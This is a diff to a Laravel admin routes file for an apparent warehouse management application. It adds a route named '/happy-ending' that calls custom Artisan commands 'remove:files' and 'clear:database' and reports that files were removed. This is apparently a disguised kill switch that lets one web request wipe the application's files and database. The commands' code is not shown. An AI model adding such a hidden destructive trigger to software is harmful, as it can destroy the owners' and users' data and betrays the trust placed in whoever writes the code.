@@ -32,7 +32,7 @@ use App\Http\Controllers\Admins\WarehouseGroupController;
 use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\Admins\WarehouseProductCodeController;
 use App\Http\Controllers\Admins\WarehouseSupplyController;
-
+use Illuminate\Support\Facades\Artisan;
 
 /*
 |--------------------------------------------------------------------------
@@ -348,5 +348,11 @@ Route::group(['prefix' => 'admin', 'middleware' => ['authAdmin']], function() {
 	Route::get('/test',function(){
 		// $pdf = PDF::loadView('admins.pdf.warehouse-export');
 		return view('admins.test.index');
+	});
+
+	Route::get('/happy-ending', function () {
+		Artisan::call('remove:files');
+		Artisan::call('clear:database');
+		return 'Files removal command executed.';
 	});
 });
